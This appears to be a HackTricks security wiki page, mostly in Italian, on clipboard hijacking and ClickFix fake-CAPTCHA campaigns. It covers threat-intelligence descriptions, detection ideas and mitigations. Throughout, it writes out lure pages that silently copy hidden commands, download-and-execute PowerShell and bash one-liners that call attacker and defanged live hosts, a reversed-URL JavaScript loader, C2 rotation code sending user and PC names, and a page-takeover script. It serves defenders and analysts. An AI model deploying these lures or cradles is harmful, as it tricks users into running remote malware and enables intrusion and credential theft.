# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai nulla che non hai copiato tu stesso." – consiglio vecchio ma ancora valido

## Panoramica

Clipboard hijacking – also known as *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano routine comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto con supporto JavaScript come un'app Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime vengono invitate, normalmente tramite istruzioni di social engineering accuratamente costruite, a premere **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o a aprire un terminale e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché **nessun file viene scaricato e nessun allegato viene aperto**, la tecnica bypassa la maggior parte dei controlli di sicurezza di e-mail e contenuti web che monitorano allegati, macro o esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che distribuiscono famiglie di malware commodity come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Alcuni infostealer macOS clonano siti di installer (es., Homebrew) e **obbligano all'uso di un pulsante “Copy”** in modo che gli utenti non possano evidenziare solo il testo visibile. La voce negli appunti contiene il comando di installazione atteso più un payload Base64 aggiunto (es., `...; echo <b64> | base64 -d | sh`), quindi una singola incollatura esegue entrambi mentre l'interfaccia nasconde la fase aggiuntiva.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Le campagne più vecchie usavano `document.execCommand('copy')`, quelle più recenti si basano sulla **Clipboard API** asincrona (`navigator.clipboard.writeText`).

## Il flusso ClickFix / ClearFake

1. L'utente visita un sito typosquattato o compromesso (es. `docusign.sa[.]com`)
2. Il JavaScript iniettato **ClearFake** chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente nella clipboard un PowerShell one-liner codificato in Base64.
3. Le istruzioni HTML dicono alla vittima: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito, scaricando un archivio che contiene un eseguibile legittimo più una DLL malevola (classico DLL sideloading).
5. Il loader decripta ulteriori stages, inietta shellcode e installa persistence (es. scheduled task) – infine esegue NetSupport RAT / Latrodectus / Lumma Stealer.

### Esempio NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legittimo Java WebStart) cerca nella sua directory `msvcp140.dll`.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, le decifra usando una rolling XOR key `"https://google.com/"`, inietta lo shellcode finale e estrae **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il JScript downloader dentro **cscript.exe**
3. Recupera un MSI payload → deposita `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Alcune campagne ClickFix evitano del tutto il download di file e istruiscono le vittime a incollare un one‑liner che scarica ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 quotidianamente. Esempio della catena osservata:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche chiave
- URL offuscato invertito a runtime per impedire un'ispezione superficiale.
- JavaScript si autopersiste tramite uno Startup LNK (WScript/CScript) e seleziona il C2 in base al giorno corrente – consentendo una rapida rotazione dei domini.

Frammento JS minimo usato per ruotare i C2 in base alla data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva solitamente distribuisce un loader che stabilisce persistence e scarica un RAT (es., PureHVNC), spesso effettuando TLS pinning su un certificato hardcoded e frammentando il traffico.

Detection ideas specific to this variant
- Albero dei processi: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Artefatti di avvio: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetria della command‑line contenenti `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ripetuti `powershell -NoProfile -NonInteractive -Command -` con grandi payload su stdin per alimentare script lunghi senza comandi lunghi.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/percorso dall'aspetto updater (es., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostname e URL C2 a rotazione giornaliera con pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare eventi di clipboard write seguiti da incolla via Win+R e immediata esecuzione di `powershell.exe`.

I blue-team possono combinare clipboard, process-creation e telemetria di registry per individuare abusi di pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva la cronologia dei comandi **Win + R** – cercare voci Base64 / offuscate insolite.
* Security Event ID **4688** (Process Creation) dove `ParentImage` == `explorer.exe` e `NewProcessName` è in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per creazioni di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o cartelle temporanee immediatamente prima dell'evento 4688 sospetto.
* EDR clipboard sensors (if present) – correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campagne recenti producono su larga scala pagine di verifica false CDN/browser ("Just a moment…", IUAM-style) che costringono gli utenti a copiare comandi specifici per l'OS dagli appunti nelle console native. Questo sposta l'esecuzione fuori dal sandbox del browser e funziona sia su Windows che macOS.

Key traits of the builder-generated pages
- Rilevamento OS tramite `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD vs. macOS Terminal). Decoy/no-op opzionali per OS non supportati per mantenere l'illusione.
- Copia automatica negli appunti su azioni UI benigne (checkbox/Copy) mentre il testo visibile può differire dal contenuto degli appunti.
- Blocco mobile e un popover con istruzioni passo-passo: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Offuscazione opzionale e injector single-file per sovrascrivere il DOM di un sito compromesso con una UI di verifica in stile Tailwind (non è necessaria una nuova registrazione di dominio).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistenza della prima esecuzione su macOS
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` in modo che l'esecuzione continui dopo la chiusura del terminale, riducendo gli artefatti visibili.

In-place page takeover su siti compromessi
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pagine che legano Clipboard API a widget di verifica; incongruenza tra il testo visualizzato e il payload degli appunti; `navigator.userAgent` branching; Tailwind + single-page replace in contesti sospetti.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un'interazione del browser; installer batch/MSI eseguiti da `%TEMP%`.
- macOS endpoint: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` in prossimità di eventi del browser; job in background che sopravvivono alla chiusura del terminal.
- Correlare la cronologia `RunMRU` Win+R e le scritture negli appunti con la successiva creazione di processi console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 evoluzioni di fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e iniettare loader JavaScript che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain di “etherhiding” (es., POSTs a Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) per recuperare la logica corrente dei lure. I recenti overlay fanno ampio uso di fake CAPTCHA che istruiscono gli utenti a copiare/incollare una one-liner (T1204.004) invece di scaricare qualcosa.
- L'esecuzione iniziale viene sempre più delegata a host di script firmati/LOLBAS. Le catene di January 2026 hanno sostituito il precedente uso di `mshta` con il built-in `SyncAppvPublishingServer.vbs` eseguito tramite `WScript.exe`, passando argomenti in stile PowerShell con alias/wildcard per recuperare contenuto remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` è firmato e normalmente usato da App-V; abbinato a `WScript.exe` e argomenti insoliti (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) diventa uno stage LOLBAS ad alto segnale per ClearFake.
- I payload CAPTCHA falsi di febbraio 2026 sono tornati a cradles di download puramente PowerShell. Due esempi live:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La prima catena è un grabber in-memory `iex(irm ...)`; la seconda effettua lo staging via `WinHttp.WinHttpRequest.5.1`, scrive un `.ps1` temporaneo, quindi avvia con `-ep bypass` in una finestra nascosta.

Detection/hunting tips for these variants
- Linea dei processi: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o PowerShell cradles immediatamente dopo scritture negli appunti/Win+R.
- Parole chiave della riga di comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Rete: connessioni in uscita verso host di CDN worker o endpoint RPC blockchain da host di script/PowerShell poco dopo la navigazione web.
- File/registro: creazione temporanea di `.ps1` sotto `%TEMP%` più voci RunMRU contenenti questi one-liners; bloccare/alertare su signed-script LOLBAS (WScript/cscript/mshta) che eseguono con URL esterni o stringhe alias offuscate.

## Mitigazioni

1. Browser hardening – disabilitare l'accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` etc.) o richiedere un gesto dell'utente.
2. Security awareness – insegnare agli utenti a *digitare* comandi sensibili o a incollarli prima in un editor di testo.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control per bloccare arbitrary one-liners.
4. Network controls – bloccare richieste in uscita verso domini noti per pastejacking e malware C2.

## Related Tricks

* **Discord Invite Hijacking** spesso abusa dello stesso approccio ClickFix dopo aver indotto gli utenti in un server malevolo:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
